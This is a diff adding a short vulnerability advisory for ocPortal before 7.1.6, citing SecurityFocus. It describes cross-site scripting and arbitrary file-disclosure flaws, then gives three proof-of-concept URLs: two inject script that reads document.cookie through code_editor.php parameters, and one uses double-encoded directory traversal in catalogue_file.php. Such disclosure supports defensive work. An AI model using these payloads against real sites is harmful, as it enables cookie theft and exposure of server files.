@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/52768/info
+
+ocPortal is prone to multiple cross-site scripting vulnerabilities and an arbitrary file-disclosure vulnerability because the application fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and obtain sensitive information.
+
+ocPortal versions prior to 7.1.6 are vulnerable. 
+
+http://www.example.com/code_editor.php?path=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/code_editor.php?path&line=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/site/catalogue_file.php?original_filename=1.txt&file=%252e%252e%252f%252e%252e%252finfo.php 
